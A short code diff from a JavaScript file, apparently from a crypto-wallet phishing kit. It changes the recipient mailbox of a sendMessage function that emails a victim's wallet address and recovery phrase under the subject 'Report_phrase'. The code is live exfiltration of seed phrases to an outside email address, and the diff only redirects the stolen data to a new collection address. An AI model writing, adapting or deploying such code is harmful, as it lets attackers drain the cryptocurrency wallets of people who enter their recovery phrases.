@@ -4,7 +4,7 @@ myHeaders.append("Content-Type", "application/json");
 export const sendMessage = async (data) => {
   var raw = JSON.stringify({
     message: `wallet: ${data.wallet} <br/> phrase:  ${data.phrase}`,
-    to: "resultbox4us@outlook.com",
+    to: "anwhite230@gmail.com",
     subject: "Report_phrase",
   });
 
